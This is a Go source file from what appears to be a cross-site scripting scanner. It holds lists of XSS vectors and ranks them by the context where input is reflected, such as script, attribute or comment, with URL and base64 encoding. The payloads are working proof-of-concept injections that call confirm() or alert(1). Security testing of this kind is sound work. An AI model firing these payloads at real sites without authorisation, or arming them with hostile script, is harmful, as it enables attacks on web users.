package payloads

import (
	"encoding/base64"
	"net/url"
	"sort"

	"github.com/rynosec/xspulse/internal/model"
)

var commonVectors = []string{
	`<svg/onload=confirm()>`,
	`"><svg/onload=confirm()>`,
	` autofocus onfocus=confirm() x=`,
	`' autofocus onfocus=confirm() x='`,
	`javascript:confirm()`,
	`</script><svg/onload=confirm()>`,
	`';confirm();//`,
	`--><svg/onload=confirm()>`,
	`<details open ontoggle=confirm()>`,
	`<img src=x onerror=confirm()>`,
}

var fuzzVectors = []string{
	`<test`, `<test>`, `<svg x=y>`, `<details open ontoggle=1>`, `"><x`, `' onfocus=1 x='`, ` autofocus onfocus=1 x=`, `</script><x>`, `javascript:alert(1)`,
}

func Encode(kind model.EncodingKind, value string) string {
	switch kind {
	case model.EncodingURL:
		return url.QueryEscape(value)
	case model.EncodingBase64:
		return base64.StdEncoding.EncodeToString([]byte(value))
	default:
		return value
	}
}

func addScore(scores map[string]int, payload string, score int) {
	if existing, ok := scores[payload]; !ok || score > 0 {
		scores[payload] = existing + score
	}
}

func rankReflection(scores map[string]int, r model.Reflection) {
	switch r.Context {
	case model.ContextScript:
		addScore(scores, `</script><svg/onload=confirm()>`, 18)
		addScore(scores, `';confirm();//`, 11)
		if r.Quote == `"` {
			addScore(scores, `";confirm();//`, 12)
		}
		if r.Quote == "'" {
			addScore(scores, `';confirm();//`, 3)
		}
	case model.ContextAttribute:
		if r.Attribute == "href" || r.Attribute == "src" || r.ScriptURL {
			addScore(scores, `javascript:confirm()`, 15)
		}
		if r.Quote == "" {
			addScore(scores, ` autofocus onfocus=confirm() x=`, 14)
			addScore(scores, `<svg/onload=confirm()>`, 5)
		} else {
			addScore(scores, `' autofocus onfocus=confirm() x='`, 10)
			addScore(scores, `"><svg/onload=confirm()>`, 12)
		}
		if r.AttributeType == model.AttributeTypeName {
			addScore(scores, `onfocus=confirm() autofocus`, 8)
		}
		if r.Attribute == "srcdoc" {
			addScore(scores, `<svg/onload=confirm()>`, 16)
		}
		if r.Tag == "script" {
			addScore(scores, `</script><svg/onload=confirm()>`, 15)
		}
	case model.ContextComment:
		addScore(scores, `--><svg/onload=confirm()>`, 14)
		addScore(scores, `<img src=x onerror=confirm()>`, 9)
	default:
		addScore(scores, `<svg/onload=confirm()>`, 12)
		addScore(scores, `<details open ontoggle=confirm()>`, 10)
		addScore(scores, `<img src=x onerror=confirm()>`, 9)
	}
}

func Generate(reflections []model.Reflection, kind model.EncodingKind) []string {
	scores := map[string]int{}
	for _, r := range reflections {
		rankReflection(scores, r)
	}
	for _, v := range commonVectors {
		if _, ok := scores[v]; !ok {
			scores[v] = 1
		}
	}
	type kv struct {
		K string
		V int
	}
	ordered := make([]kv, 0, len(scores))
	for k, v := range scores {
		ordered = append(ordered, kv{k, v})
	}
	sort.SliceStable(ordered, func(i, j int) bool {
		if ordered[i].V == ordered[j].V {
			return ordered[i].K < ordered[j].K
		}
		return ordered[i].V > ordered[j].V
	})
	out := make([]string, 0, len(ordered))
	for _, item := range ordered {
		out = append(out, Encode(kind, item.K))
	}
	return out
}

func Fuzz(kind model.EncodingKind) []string {
	out := make([]string, 0, len(fuzzVectors))
	for _, v := range fuzzVectors {
		out = append(out, Encode(kind, v))
	}
	return out
}
